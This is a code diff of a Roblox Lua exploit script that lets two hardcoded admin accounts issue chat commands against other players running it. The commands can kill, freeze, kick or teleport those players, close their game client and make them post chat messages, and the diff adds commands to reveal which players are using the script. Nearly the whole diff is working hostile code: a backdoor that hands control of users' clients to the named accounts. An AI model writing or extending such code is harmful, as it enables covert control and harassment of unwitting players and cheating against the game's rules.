@@ -3,6 +3,9 @@ local Admins = {"Pxrple001","bestgamer_pogi24"}
 
 --[[ Commands List ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
+:showusers
+:hideusers
+
 :kill
 :kill all
 :freeze
@@ -106,28 +109,27 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
    local UsersFound = {}
    game:GetService("RunService").RenderStepped:Connect(function()
    for i,v in pairs(game.Players:GetPlayers()) do
-     if v.Character:FindFirstChild("Head") and not v.Character.Head:FindFirstChild("USER ESP") then
+     if v.Character:FindFirstChild("HumanoidRootPart") and not v.Character.HumanoidRootPart:FindFirstChild("USER ESP") then
         for key, value in pairs(UsersFound) do
           if value == v.Name then
              local BillboardGui = Instance.new("BillboardGui")
              local TextLabel = Instance.new("TextLabel")
              local UICorner = Instance.new("UICorner") 
  
-             BillboardGui.Parent = v.Character:FindFirstChild("Head")
+             BillboardGui.Parent = v.Character:FindFirstChild("HumanoidRootPart")
              BillboardGui.Name = "USER ESP"
-             BillboardGui.AlwaysOnTop = false
+             BillboardGui.AlwaysOnTop = true
              BillboardGui.LightInfluence = 0
              BillboardGui.Size = UDim2.new(0, 8, 0, 8)
-             BillboardGui.StudsOffset = Vector3.new(0, 1.5, 0)
+             BillboardGui.StudsOffset = Vector3.new(0, 0, 0)
 
              TextLabel.Parent = BillboardGui
              TextLabel.BackgroundColor3 = Color3.new(1,1,1)
-             TextLabel.BackgroundTransparency = 0
+             TextLabel.BackgroundTransparency = 1
              TextLabel.Size = UDim2.new(1, 0, 1, 0)
-             TextLabel.Text = ""
-
-             UICorner.Parent = TextLabel
-             UICorner.CornerRadius = UDim.new(1,0)
+             TextLabel.Text = v.Name
+             TextLabel.TextColor3 = Color3.new(1,1,1)
+             TextLabel.Visible = false
           end
         end
      end
@@ -145,38 +147,45 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
     if admin_msg:sub(1,1) ~= ":" then
        return
     end
+    
+    ---Only Admin Script
+    if admin_msg == ":showusers" then
+       for _, v in pairs(game.Players:GetPlayers()) do 
+         if v.Character.HumanoidRootPart:FindFirstChild("USER ESP") then
+            v.Character.HumanoidRootPart:FindFirstChild("USER ESP").TextLabel.Visible = true
+         end
+       end
+    elseif admin_msg == ":hideusers" then
+       for _, v in pairs(game.Players:GetPlayers()) do 
+         if v.Character.HumanoidRootPart:FindFirstChild("USER ESP") then
+            v.Character.HumanoidRootPart:FindFirstChild("USER ESP").TextLabel.Visible = false
+         end
+       end
+    end
+    ---
+    
     if string.find(admin_msg, " ") then
        if CountCharacter(admin_msg, " ") == 1 then
-          local user = admin_msg:sub(FindIndex(admin_msg, " ", 1) + 1, string.len(admin_msg))
+          local user = admin_msg:sub(FindIndex(admin_msg, " ") + 1, string.len(admin_msg))
           if string.find(MyName, user) or string.find(MyDisplayName, user) then
              MyName = user
           end
-       elseif CountCharacter(admin_msg, " ") == 2 then
-          local user = admin_msg:sub(FindIndex(admin_msg, " ", 1) + 1, string.len(admin_msg))
-          user = user:sub(1, FindIndex(user, " ", 1) - 1)
+       else
+          local user = admin_msg:sub(FindIndex(admin_msg, " ") + 1, FindIndex(admin_msg, " ", 2) - 1)
           if string.find(MyName, user) or string.find(MyDisplayName, user) then
              MyName = user
           end
        end
     end
+    
     if admin_msg == ":kill "..MyName or admin_msg == ":kill "..MyDisplayName or admin_msg == ":kill all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        game.Players.LocalPlayer.Character.Head:Destroy()
     elseif admin_msg == ":freeze "..MyName or admin_msg == ":freeze "..MyDisplayName then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
     elseif admin_msg == ":unfreeze "..MyName or admin_msg == ":unfreeze "..MyDisplayName then
        game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-    elseif string.find(admin_msg.." ", ":kick "..MyName.." ") or string.find(admin_msg.." ", ":kick "..MyDisplayName.." ") or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= admin.Name and MyName ~= Ghostplayer then
-       if string.find(admin_msg, MyName) then
-          admin_msg = string.gsub(admin_msg, ":kick "..MyName, "")
-       elseif string.find(admin_msg, MyDisplayName) then
-          admin_msg = string.gsub(admin_msg, ":kick "..MyDisplayName, "")
-       elseif string.find(admin_msg, ":kick all") then
-          admin_msg = string.gsub(admin_msg, ":kick all", "")
-       end
-       if admin_msg ~= "" then
-          admin_msg = "\n"..admin_msg
-       end
-       game.Players.LocalPlayer:Kick(admin_msg)
+    elseif string.find(admin_msg.." ", ":kick "..MyName) or string.find(admin_msg.." ", ":kick "..MyDisplayName) or string.find(admin_msg.." ", ":kick all".." ") and MyName ~= admin.Name and MyName ~= Ghostplayer then
+       game.Players.LocalPlayer:Kick(admin_msg:sub(FindIndex(admin_msg, " ", 2) + 1, string.len(admin_msg)))
     elseif admin_msg == ":exit "..MyName or admin_msg == ":exit "..MyDisplayName or admin_msg == ":exit all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        game:Shutdown()
     elseif admin_msg == ":bring "..MyName or admin_msg == ":bring "..MyDisplayName or admin_msg == ":bring all" and MyName ~= admin.Name and MyName ~= Ghostplayer then
@@ -213,8 +222,7 @@ if not game:GetService("ReplicatedStorage"):FindFirstChild("Admin") then
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = lastCFrame
        workspace.FallenPartsDestroyHeight = -500
     elseif string.find(admin_msg, ":say "..MyName.." ") or string.find(admin_msg, ":say "..MyDisplayName.." ") then
-       admin_msg = admin_msg:sub(FindIndex(admin_msg, " ", 2), string.len(admin_msg))
-       SendMessage(admin_msg)
+       SendMessage(admin_msg:sub(FindIndex(admin_msg, " ", 2) + 1, string.len(admin_msg)))
     elseif admin_msg == ":" and MyName ~= admin.Name and MyName ~= Ghostplayer then
        SendMessage("✅ Im Here ✅")
        wait(0.1)
